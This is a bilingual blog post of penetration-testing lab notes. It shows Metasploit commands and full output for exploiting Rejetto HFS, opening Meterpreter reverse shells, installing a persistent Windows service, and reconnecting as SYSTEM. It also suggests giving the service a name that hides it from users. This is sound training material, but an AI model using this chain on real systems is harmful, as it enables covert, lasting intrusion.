---
layout: post
title: "Establishing Persistence On Windows"
date: "2023-02-27"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Establishing Persistence On Windows
Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

# 在 Windows 上建立持久性
持久性包括对手用来在重启、更改凭据和其他可能切断其访问的中断期间保持对系统的访问的技术。

获得最初的立足点是不够的，您需要建立并保持对目标的持续访问。

我们可以利用各种后期利用持久性模块来确保我们始终可以访问目标系统。

# Demo: Establishing Persistence On Windows（演示：在 Windows 上建立持久性）
And the technique we will be exploring is the process of setting up a persistent service on the target system that will constantly be running. And what that means is that if we lose our Meterpreter session, we can get it back almost instantaneously, as long as the persistent service is running on the target system. So we don't have to rely on exploiting a service to gain access, and we don't have to rely on credentials. Once we've established persistence, we can gain access to the target system whenever it's active or online.

Target IP Address: 10.2.19.11

```
service postgresql start && msfconsole
workspace -a Persistence
setg RHOSTS 10.2.19.11
```

We'll use the `db_nmap` command to perform the Nmap scan from within the MSF console. And this command will consequently save all the Nmap scan results into the MSF database.

`-sV`: Perform a service scan.

```
db_nmap -sV 10.2.19.11
```

```
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST eth1
exploit
```

Perform some system enumeration.

```
meterpreter > sysinfo
```

Get our current user privileges. We currently have access as the Administrator user, which is very important. Because in order to set up persistence, you will require elevated privileges or administrative privileges.

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

Now that we've gained access to the target system, what we need to do is ensure that we can always get access to the target system without having to exploit the vulnerable service. Because we have to assume that at some point, that service will either be shut down or will be disabled or it will be patched. So we cannot rely on a vulnerable services in regards to gaining access. Once we've gained access to a system, we've got our lucky break, so we need to use that access very wisely.

Put this in the background.

```
search platform:windows persistence
```

In the case of the standard persistence module here. This will establish persistence via the Windows Registry. But you cannot rely on that. And that will allow you to gain access to the target system whenever it's restarted. That's something that we cannot rely on. We want something that is constantly running and that can provide us with access whenever we want to gain access.

```
exploit/windows/local/persistence Windows Persistent Registry Startup Payload Installer
```

The `persistence_service` module will create a persistent service that will be paired with the Meterpreter payload. And whenever we have a listener or a multi handler up and running, we should be able to receive a connection from the target. This is the Windows Persistent Service Installer.

```
use exploit/windows/local/persistence_service
set payload windows/x64/meterpreter/reverse_tcp
show options
```

In this case, we can specify a `SERVICE_NAME`. You may want to make the service look as legitimate as possible. Because users on the system may be able to detect your service through the Task Manager. So you can probably specify a service name that blends in with the rest of the Windows Services.

```
set SESSION 1
```

We also can leave the LPORT option as port 4444. Because, in this case, it's not going to be executing the payload or giving us a Meterpreter session. It's going to allow us to do that once we setup our handler and we terminate our current Meterpreter session just to show you that it will work.

```
exploit
[-] Only support for windows meterpreter/shell reversed stage payload.
```

We will set the payload here to the 32-bit Meterpreter payload. Because we can always upgrade our Meterpreter session to a 64-bit session.

```
set payload windows/meterpreter/reverse_tcp
exploit
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Terminate my session now.

```
meterpreter > exit
```

List out my previous sessions. I'm going to kill all of the sessions.

```
sessions
sessions -K
```

And now, you can see that we don't have access at all.

The way we can get access or gain back control of the target system and obtain a Meterpreter session is by using `multi/handler`.

```
use multi/handler
```

Set the payload to the payload we specified for the persistence module.

```
set payload windows/meterpreter/reverse_tcp
show options
```

Make sure we configure the LHOST and the LPORT options to the values that we had set up.

Leave LPORT as 4444, because that is what we specified for the persistence module payload.

```
set LHOST eth1
run
```

We immediately get a Meterpreter session.

```
meterpreter > 
```

What's happening here is once we installed the persistence service, once we've installed it, it's going to run and it's going to continue to run, even across restarts. And as long as we have a `multi/handler` running or listening for a connection from the target, we should be able to receive a connection.

```
meterpreter > exit
run
meterpreter > 
```

We can get as many as required or we can get access whenever we want.

The key thing here is to always keep in mind or take note of the LHOST and LPORT options you specified when generating or specifying the payload options for the persistence service module.

And that is how to establish persistence on the target system.

There's multiple other techniques that you can utilize. But those techniques are unstable. And in my experience, this is probably one of the best options to begin with in terms of setting up and maintaining persistence on a target system.

Even if I exit from msfconsole, and I start up a new session within a different workspace. I can go through the same process and always receive a connection back from the target, unless the persistence service is terminated for whatever reason.

```
meterpreter > exit
exit
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
run
meterpreter > exit
```

# Maintaining Access: Persistence Service
## Overview
A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, use the exploit/windows/local/persistence_service local exploit module to maintain access.

Objective: Exploit the application and maintain access using the Metasploit module.

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
* The IP address of the target machine is mentioned in the file “/root/Desktop/target”
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2140.pdf

# 维护访问：持久性服务
## 概述
为您提供了 Kali GUI 机器和运行易受攻击服务器的目标机器。目标机器的 IP 地址在位于 Kali 机器桌面 (/root/Desktop/target) 上的名为 target 的文本文件中提供。

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用该应用程序。

然后，使用 exploit/windows/local/persistence_service 本地漏洞利用模块来保持访问。

目标：使用 Metasploit 模块利用应用程序并维护访问权限。

指示：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”来知道 X 和 Y 的值。
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

## 解决方案
本实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2140.pdf

# 复现视频内容
Target IP Address : 10.0.30.12

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 13 database server: main.
msf6 > workspace -a Persistence
[*] Added workspace: Persistence
[*] Workspace: Persistence
msf6 > setg RHOSTS 10.0.30.12
RHOSTS => 10.0.30.12
msf6 > db_nmap -sV 10.0.30.12
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-27 19:18 IST
[*] Nmap: Nmap scan report for 10.0.30.12
[*] Nmap: Host is up (0.0031s latency).
[*] Nmap: Not shown: 990 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49167/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 66.84 seconds
msf6 > services
Services
========

host        port   proto  name               state  info
----        ----   -----  ----               -----  ----
10.0.30.12  80     tcp    http               open   HttpFileServer httpd 2.3
10.0.30.12  135    tcp    msrpc              open   Microsoft Windows RPC
10.0.30.12  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.0.30.12  445    tcp    microsoft-ds       open   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
10.0.30.12  3389   tcp    ssl/ms-wbt-server  open   
10.0.30.12  49152  tcp    msrpc              open   Microsoft Windows RPC
10.0.30.12  49153  tcp    msrpc              open   Microsoft Windows RPC
10.0.30.12  49154  tcp    msrpc              open   Microsoft Windows RPC
10.0.30.12  49155  tcp    msrpc              open   Microsoft Windows RPC
10.0.30.12  49167  tcp    msrpc              open   Microsoft Windows RPC

```

```
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.0.30.12       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST eth1
LHOST => eth1

```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Using URL: http://0.0.0.0:8080/FpJQJu8V0Bd
[*] Local IP: http://10.10.16.2:8080/FpJQJu8V0Bd
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /FpJQJu8V0Bd
[*] Sending stage (200262 bytes) to 10.0.30.12
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.30.12:49239) at 2023-02-27 19:24:22 +0530
[!] Tried to delete %TEMP%\MzVmhJmYkEdzf.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator

```

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x64/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.16.2:4444 -> 10.0.30.12:49239 (10.0.30.12)

```

[Windows Persistent Registry Startup Payload Installer](https://www.rapid7.com/db/modules/exploit/windows/local/persistence/)

This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in "CurrentVersion\Run" (depending on privilege and selected method).

Windows 持久注册表启动负载安装程序

该模块将安装在引导期间执行的有效负载。它将在用户登录或系统启动时通过“CurrentVersion\Run”中的注册表值执行（取决于权限和选择的方法）。

[Windows Persistent Service Installer](https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/)

This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

Windows 持久服务安装程序

该模块将生成可执行文件并将其上传到远程主机，接下来将使它成为持久服务。它将创建一个新服务，该服务将在服务运行时启动有效负载。需要管理员或系统权限。

```
msf6 exploit(windows/http/rejetto_hfs_exec) > search platform:windows persistence

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   1   exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence
   2   exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   3   exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   4   exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence
   5   exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   6   exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   7   exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence
   8   post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   9   post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer
   10  post/windows/manage/sshkey_persistence                                 good       No     SSH Key Persistence


Interact with a module by name or index. For example info 10, use 10 or use post/windows/manage/sshkey_persistence
```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/persistence_service
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > show options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows

```

```
模块选项（exploit/windows/local/persistence_service）：

    名称            当前设置        是否需要   说明
    ----            -------------- ------    ----------
    REMOTE_EXE_NAME                 否       远程受害者名称。 默认为随机字符串。
    REMOTE_EXE_PATH                 否       要运行的远程受害者 exe 路径。 默认使用临时目录。
    RETRY_TIME      5               否       shell 连接失败的重试时间。 默认为 5 秒。
    SERVICE_DESCRIPTION             否       服务的描述。 默认为随机字符串。
    SERVICE_NAME                    否       服务名称。 默认为随机字符串。
    SESSION                         是       运行此模块的会话。
```

```
msf6 exploit(windows/local/persistence_service) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[-] Only support for windows meterpreter/shell reverse staged payload
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/persistence_service) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Running module against WIN-OMCNBKR66MN
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\MjhZmS.exe
[*] Creating service rysxbxZh
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20230227.5308/WIN-OMCNBKR66MN_20230227.5308.rc
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Running module against WIN-OMCNBKR66MN
[*] Sending stage (175174 bytes) to 10.0.30.12
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\prkPSbX.exe
[*] Creating service KndMoIec
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20230227.5450/WIN-OMCNBKR66MN_20230227.5450.rc
[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.0.30.12:49349) at 2023-02-27 19:54:50 +0530

meterpreter > 

```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x64/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.16.2:4444 -> 10.0.30.12:49239 (10.0.30.12)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN            10.10.16.2:4444 -> 10.0.30.12:49349 (10.0.30.12)

msf6 exploit(windows/local/persistence_service) > sessions -K
[*] Killing all sessions...
[*] 10.0.30.12 - Meterpreter session 1 closed.
[*] 10.0.30.12 - Meterpreter session 2 closed.
msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

No active sessions.

```

```
msf6 exploit(windows/local/persistence_service) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST eth1
LHOST => 10.10.16.2
```

Target IP Address : 10.0.25.213

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Sending stage (175174 bytes) to 10.0.25.213
[*] Meterpreter session 3 opened (10.10.16.3:4444 -> 10.0.25.213:49284) at 2023-02-27 21:05:57 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.0.25.213 - Meterpreter session 3 closed.  Reason: User exit
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Sending stage (175174 bytes) to 10.0.25.213
[*] Meterpreter session 4 opened (10.10.16.3:4444 -> 10.0.25.213:49293) at 2023-02-27 21:07:56 +0530

meterpreter > 
```

```
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.0.25.213 - Meterpreter session 4 closed.  Reason: User exit
msf6 exploit(multi/handler) > exit
root@attackdefense:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST eth1
LHOST => eth1
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Sending stage (175174 bytes) to 10.0.25.213
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.0.25.213:49317) at 2023-02-27 21:12:18 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.0.25.213 - Meterpreter session 1 closed.  Reason: User exit
```